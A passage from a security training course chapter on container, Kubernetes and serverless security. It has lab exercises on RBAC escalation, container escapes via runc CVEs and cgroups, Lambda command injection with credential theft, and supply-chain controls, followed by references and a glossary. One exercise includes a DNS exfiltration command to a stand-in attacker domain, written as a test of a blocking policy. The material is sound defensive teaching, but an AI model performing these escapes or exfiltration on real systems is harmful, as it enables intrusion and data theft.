...
modulo: "10.2"
titolo: "Container, Kubernetes, and Serverless Security"
versione: "Kubernetes 1.28-1.32, runc 1.1-1.2, containerd 1.7-2.0, Falco 0.38+, Kyverno 1.12+"
livello: "Advanced"
prerequisiti:
  - "Linux namespaces, cgroups, and capabilities (Domain 2)"
  - "Container fundamentals (Docker, OCI runtime specification)"
  - "Kubernetes architecture (API server, kubelet, etcd, RBAC)"
  - "Cloud provider IAM basics (Chapter 10A)"
  - "Serverless compute concepts (Lambda, Cloud Functions, Azure Functions)"
obiettivi:
  - "Reproduce container escape techniques (runc CVEs, cgroup release_agent, nsenter) and verify mitigations"
  - "Audit Kubernetes RBAC policies for privilege-escalation paths and enforce Pod Security Standards"
  - "Deploy and tune admission controllers (OPA/Gatekeeper, Kyverno) to block insecure workload configurations"
  - "Write Falco and Tetragon rules for runtime detection of container escapes, cryptomining, and lateral movement"
  - "Implement supply-chain integrity controls: image signing with cosign, SBOM generation, and admission-time verification"
tag: [container-security, kubernetes, rbac, docker, serverless, falco, kyverno, supply-chain, container-escape, pod-security, mitre-attack]
---

# Domain 10, Chapter 10B — Container, Kubernetes, and Serverless Security

> **Learning objectives.** After completing this chapter, you will be able to: (1) exploit Docker daemon socket exposure and privileged container misconfiguration to achieve host-level access; (2) identify dangerous RBAC permission combinations and remediate overprivileged ServiceAccounts; (3) configure NetworkPolicy and Cilium L7 policies for default-deny segmentation; (4) construct Falco, Sigma, and Tetragon detection rules for container escape indicators and Kubernetes API abuse; (5) build a secure image pipeline with digest pinning, vulnerability scanning (Trivy/Grype), cosign signing, and admission enforcement.
...
> See also: [tutorials/tutorial_domain10_ch10B_container_k8s_lab.md](tutorials/tutorial_domain10_ch10B_container_k8s_lab.md)

**Exercise 10B.1 — Kubernetes RBAC audit and privilege-escalation detection (T1078.004).** Deploy a multi-namespace Kubernetes cluster (minikube or kind). Create intentionally overprivileged ServiceAccounts: one with `create pods` in `kube-system`, one with `get secrets` cluster-wide, one with `escalate` verb on ClusterRoles. Using `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>`, enumerate the effective permissions of each SA. Demonstrate the `create pods → cluster-admin` escalation chain (§2.2) by creating a pod that mounts the SA token and accesses cluster secrets. Write a Falco rule that detects pod creation in `kube-system` by non-system ServiceAccounts. Apply Pod Security Standards (`restricted` profile) to the namespace and verify the escalation pod is rejected. Reference: MITRE ATT&CK — T1078.004 (Valid Accounts: Cloud Accounts), T1611 (Escape to Host).

**Exercise 10B.2 — Container escape reproduction and mitigation verification.** In a controlled lab, reproduce three container escape techniques: (a) Docker socket mount escape (§1.1 — create privileged container via mounted socket), (b) cgroup `release_agent` escape (§1.6.4 — requires `CAP_SYS_ADMIN`), (c) CVE-2024-21626 Leaky Vessels WORKDIR escape (§1.6.2 — use a vulnerable runc version). For each escape, document: the prerequisites, the exact command sequence, the host-level access achieved, and the telemetry generated (Falco alerts, Sysmon events, auditd records). Apply mitigations: remove socket mount, drop all capabilities, upgrade runc to >= 1.1.12. Re-attempt each escape and confirm failure. Write a Sigma rule for Kubernetes audit logs that detects pod creation with `hostPID: true` or `privileged: true`. Reference: T1611 (Escape to Host), CVE-2024-21626, CVE-2022-0492.

**Exercise 10B.3 — Serverless event injection and execution role audit (T1190).** Deploy an AWS Lambda function triggered by S3 `PutObject` events, where the handler uses the S3 object key in a `subprocess.run()` call with `shell=True` (the vulnerable pattern from §6.1). Upload a file with a crafted key containing command injection payload. Verify RCE and demonstrate credential theft via the Lambda execution role. Harden: rewrite the handler to use parameterized execution (`subprocess.run([...])` without `shell=True`), validate the key format, and reduce the execution role to least-privilege (`s3:GetObject` on the specific bucket only). Deploy the same pattern on GCP Cloud Functions and verify the same injection/mitigation cycle. Write a CloudTrail data-event query to detect unusual Lambda invocation sources. Reference: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter).

**Exercise 10B.4 — Supply chain integrity pipeline.** Build a CI/CD pipeline (GitHub Actions or GitLab CI) that: (a) builds a container image from a multi-stage Dockerfile (§3.2), (b) scans it with Trivy (`--severity CRITICAL,HIGH`), (c) generates an SBOM with syft (CycloneDX format), (d) signs the image with cosign (keyless via OIDC), (e) pushes to a private registry. Deploy a Kyverno ClusterPolicy (§3.5) that enforces image signature verification and digest pinning — pods with unsigned or tag-referenced images must be rejected. Attempt to deploy an unsigned image and verify admission denial. Scan the SBOM with Grype and document any vulnerable dependencies. Reference: T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain).

**Exercise 10B.5 — NetworkPolicy and DNS exfiltration detection.** In a Kubernetes cluster with Cilium CNI, apply the default-deny NetworkPolicy (§2.5) to a `production` namespace. Incrementally allow: DNS egress to `kube-dns`, web-to-database traffic on port 5432, and HTTPS egress to a specific external domain. From a test pod, attempt DNS-based data exfiltration (`dig $(echo secret | base64).attacker.com`) and verify it is blocked by the policy. Enable Cilium Hubble and CoreDNS logging, then re-test with DNS egress allowed. Write a detection rule on Hubble flow logs that identifies DNS queries with Shannon entropy > 4.0 bits/character in subdomain labels. Reference: T1048.003 (Exfiltration Over Alternative Protocol: DNS), T1071.004 (Application Layer Protocol: DNS).
...
- CVE-2024-21626 — runc Leaky Vessels file descriptor leak (CVSS 8.6): <https://nvd.nist.gov/vuln/detail/CVE-2024-21626>
- CVE-2022-0492 — cgroup v1 release_agent container escape: <https://nvd.nist.gov/vuln/detail/CVE-2022-0492>
- CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 — runC race-condition container escapes (2025): <https://www.esecurityplanet.com/news/runc-vulnerability-container-risk/>
- CVE-2025-69256 — Serverless Framework MCP server command injection: <https://www.cvedetails.com/cve/CVE-2025-69256/>
- Unit 42, "Understanding Current Threats to Kubernetes Environments" (2025): <https://unit42.paloaltonetworks.com/modern-kubernetes-threats/>
- Sysdig, "Serverless Security in AWS Lambda: 2025 Attack Trends": <https://blog.intelligencex.org/serverless-security-in-aws-lambda-2025-attack-trends>
- Kubernetes Pod Security Standards: <https://kubernetes.io/docs/concepts/security/pod-security-standards/>
- Falco — Cloud-Native Runtime Security: <https://falco.org/>
- Cilium Tetragon — eBPF-based security observability: <https://tetragon.io/>
- Kyverno — Kubernetes Native Policy Management: <https://kyverno.io/>
- Sigstore/cosign — container image signing: <https://docs.sigstore.dev/cosign/overview/>
- Trivy — comprehensive vulnerability scanner: <https://aquasecurity.github.io/trivy/>
...
|---|---|---|
| §1.6 Container escape techniques | Chapter 10A §1.2 (IMDS) | Container escape on cloud VM leads to IMDS credential theft — the primary cloud pivot |
| §2.2 RBAC privilege escalation | Chapter 10A §1.1 (IAM) | Cloud IAM authenticates K8s API; IAM role trust + K8s RBAC create compound escalation chains |
| §1.2-1.5 Capabilities, seccomp, namespaces | Domain 2 Ch2B-2C (Syscalls, LSMs) | Container isolation primitives are the same Linux kernel mechanisms from Domain 2 |
| §6.1 Serverless event injection | Chapter 8B §1-7 (Injection) | Lambda/Cloud Function handlers are web-application parsers; same injection taxonomy |
| §3.1-3.5 Supply chain attacks | Domain 9 (Supply Chain) | Container image poisoning and CI/CD compromise are container-specific supply-chain attacks |
| §4.1 Falco runtime rules | Domain 27 (Detection Engineering) | Falco rules feed SIEM correlation; Tetragon provides kernel-level enforcement for Zero Trust |
...
| Term | Definition |
|---|---|
| **OCI Runtime** | Open Container Initiative specification defining how container runtimes (runc, crun, gVisor) create and manage containers |
| **runc** | Reference OCI runtime written in Go; used by Docker and containerd; target of CVE-2019-5736, CVE-2024-21626, and CVE-2025-31133 |
| **cgroup** | Linux kernel mechanism for resource limiting and accounting; v1 `release_agent` is exploitable for container escape (CVE-2022-0492) |
| **Pod Security Standards (PSS)** | Three Kubernetes security profiles (privileged, baseline, restricted) enforced by the PodSecurity admission controller |
| **RBAC** | Role-Based Access Control — Kubernetes authorization model binding Roles/ClusterRoles to subjects via Bindings |
| **NetworkPolicy** | Kubernetes resource controlling pod-to-pod and pod-to-external traffic at L3/L4; requires a supporting CNI (Calico, Cilium) |
| **Admission Controller** | Kubernetes API server plugin intercepting requests after auth but before persistence; includes OPA/Gatekeeper and Kyverno |
| **Falco** | CNCF runtime security tool monitoring syscalls via eBPF/kernel module and matching against detection rules |
| **Tetragon** | Cilium eBPF-based security observability and enforcement engine with Kubernetes-aware context |
| **cosign** | Sigstore tool for signing, verifying, and attaching metadata (SBOMs, attestations) to container images |
| **SBOM** | Software Bill of Materials — machine-readable inventory of software components in an image (SPDX or CycloneDX format) |
| **Workload Identity** | Cloud-native mechanism mapping K8s ServiceAccounts to cloud IAM identities for per-pod credential scoping (GKE, EKS Pod Identity, AKS) |
| **Distroless** | Minimal container base images containing no shell, package manager, or unnecessary userland — reducing attack surface |
| **Service Mesh** | Infrastructure layer (Istio, Linkerd) providing mTLS, authorization policies, and observability for service-to-service communication |
| **XDP** | eXpress Data Path — Linux eBPF hook point at the network driver level, processing packets before the kernel network stack |
